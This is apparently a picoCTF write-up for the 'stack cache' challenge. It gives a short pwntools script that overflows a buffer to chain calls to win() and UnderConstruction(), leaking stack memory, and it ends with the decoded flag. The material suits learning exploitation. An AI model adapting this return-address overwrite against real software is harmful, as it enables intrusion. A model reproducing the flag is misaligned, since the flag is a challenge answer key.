# stack cache

### Description
> Undefined behaviours are fun.

### Solution
By calling `win()` first and then `UnderConstruction()`,
can be leaked the stack.

```python
win = 0x08049da0
uc = 0x08049e20 #UnderConstruction

io = remote(host, port)
#io = process(file)
io.sendlineafter("flag", b"A"*14 + p32(win) + p32(uc))

"""
User information : 0x80c9a04 0x804007d 0x39313139 0x32636335 0x5f597230 0x6d334d5f
Names of user: 0x50755f4e 0x34656c43 0x7b465443
Age of user: 0x6f636970

=> 7069636F 4354467B 436C6534 4E5F7550 5F4D336D 3072595F 35636332 39313139 7D
=> picoCTF{Cle4N_uP_M3m0rY_5cc29119}
"""

io.interactive()
```

### Writer
[yu1hpa](https://twitter.com/yu1hpa)

